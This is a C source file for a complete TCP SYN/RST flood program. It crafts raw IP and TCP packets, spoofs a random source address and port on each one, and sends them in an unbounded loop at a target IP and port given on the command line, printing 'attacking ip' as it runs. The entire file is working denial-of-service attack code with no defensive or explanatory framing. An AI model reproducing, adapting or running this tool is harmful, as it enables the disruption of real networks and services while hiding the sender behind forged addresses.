#include <sys/socket.h>
#include <arpa/inet.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <signal.h>

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>

#define DEFAULT_IP   "127.0.0.1"
#define DEFAULT_PORT 80

static int packetCount = 0;
static bool isSending = true;
static char sourceIP[32];

struct PseudoHeader
{
    uint32_t sourceAddress;
    uint32_t destinationAddress;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcpLength;

    struct tcphdr tcpHeader;
};

static int RandomPort()  { return rand() % 65535; }
static int RandomForIP() { return rand() % 255;   }

static char* RandomIP() 
{
    strcpy(sourceIP, "");
    int dots = 0;

    while (dots < 3)
    {
        sprintf(sourceIP, "%s%d", sourceIP, RandomForIP());
        strcat(sourceIP, ".");
        fflush(NULL);
        dots++;
    }

    sprintf(sourceIP, "%s%d", sourceIP, RandomForIP());
    strcat(sourceIP, "\0");
    return sourceIP;
}

static int ValidIP(char* ip) 
{
    struct sockaddr_in socketAddressInput;
    return inet_pton(AF_INET, ip, &(socketAddressInput.sin_addr)) != 0;
}

void InterruptHandler(int signal)
{
    isSending = false;
    printf("\n%d [DATA] packets sent\n", packetCount);
    exit(0);
}

unsigned short Checksum(unsigned short* pointer, int numBytes) 
{
    register long sum = 0;
    unsigned short oddByte;
    register short answer;

    while (numBytes > 1)
    {
        sum += *pointer++;
        numBytes -= 2;
    }

    if (numBytes == 1)
    {
        oddByte = 0;
        *((unsigned char*) &oddByte) = *(unsigned char*) pointer;
        sum += oddByte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

int main(int argc, char *argv[])
{
    int destinationPort    = DEFAULT_PORT;
    char destinationIP[32] = DEFAULT_IP;
    bool useRST = false;
    bool useSYN = true;
    int option = 0;

    srand(time(0));                
    signal(SIGINT, InterruptHandler);

    while ((option = getopt(argc, argv, "t:p:r")) != -1) 
    {
        switch (option) 
        {
        case 't': {
            strcpy(destinationIP, optarg);
            if (!ValidIP(destinationIP)) 
            {
                printf("[ERR] Invalid IP - Program terminated\n");
                exit(1); 
            } } break;
        case 'p': {
            destinationPort = strtol(optarg, NULL, 10);
            if (destinationPort < 0 || destinationPort > 65535) 
            {
              printf("[ERR] Invalid PORT - Program terminated\n");
              exit(1); 
            } } break;
        case 'r': { useRST = true;
                    useSYN = false; 
            } break;
        default:
            printf("[ERR] Program terminated\n");
            exit(1);
        }
    }

    printf("[DATA] Flood is starting...\n");

    int Socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096];

    struct iphdr* ipHeader   = (struct iphdr*) datagram;
    struct tcphdr* tcpHeader = (struct tcphdr*) (datagram + sizeof(struct ip));
    struct sockaddr_in socketAddressInput;
    struct PseudoHeader pseudoHeader;

    socketAddressInput.sin_addr.s_addr = inet_addr(destinationIP);
    socketAddressInput.sin_port = htons(5060);                    
    socketAddressInput.sin_family = AF_INET;                     

    memset(datagram, 0, 4096);

    ipHeader->ihl = 5;                                            
    ipHeader->version = 4;                                        
    ipHeader->tos = 0;                                           
    ipHeader->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    ipHeader->id = htons(54321);                              
    ipHeader->frag_off = 0;              
    ipHeader->ttl = 255;                  
    ipHeader->protocol = IPPROTO_TCP;    
    ipHeader->check = 0;                 
    ipHeader->daddr = socketAddressInput.sin_addr.s_addr;

    tcpHeader->dest = htons(destinationPort);
    tcpHeader->seq = 0;                   
    tcpHeader->ack_seq = 0;
    tcpHeader->doff = 5;
    tcpHeader->fin = 0;
    tcpHeader->syn = useSYN;
    tcpHeader->rst = useRST;
    tcpHeader->psh = 0;
    tcpHeader->ack = 0;
    tcpHeader->urg = 0;
    tcpHeader->window = htons(5840);
    tcpHeader->urg_ptr = 0;

    pseudoHeader.destinationAddress = socketAddressInput.sin_addr.s_addr;
    pseudoHeader.placeholder = 0;
    pseudoHeader.protocol = IPPROTO_TCP;
    pseudoHeader.tcpLength = htons(20);

    int tempOne = 1;
    const int* value = &tempOne;
    if (setsockopt(Socket, IPPROTO_IP, IP_HDRINCL, 
                   value, sizeof(tempOne)) < 0)
    {
        printf("[ERR] number : %d  Error message : %s \n", 
               errno, strerror(errno));
        fprintf(stderr, "Program needs to be run by root user\n");
        return -1;
    }

    printf("[DATA] attacking ip %s on port %d and RST flag is %d...\n", 
           destinationIP, destinationPort, useRST);

    while (isSending) 
    {
        ipHeader->saddr = inet_addr(RandomIP());
        ipHeader->check = Checksum((unsigned short*) datagram, 
                                   ipHeader->tot_len >> 1);

        pseudoHeader.sourceAddress = inet_addr(sourceIP);
        
        tcpHeader->source = htons(RandomPort());
        tcpHeader->check = 0;               
        
        memcpy(&pseudoHeader.tcpHeader, tcpHeader, sizeof(struct tcphdr));
        tcpHeader->check = Checksum((unsigned short*) &pseudoHeader, 
                                    sizeof(struct PseudoHeader));

        if (sendto(Socket, datagram, ipHeader->tot_len, 0, 
                   (struct sockaddr*) &socketAddressInput, 
                   sizeof(socketAddressInput)) < 0) 
        {
            printf("\n[ERR] Program terminated\n");
            return 0;
        } else packetCount++;
    }

    close(Socket);
}
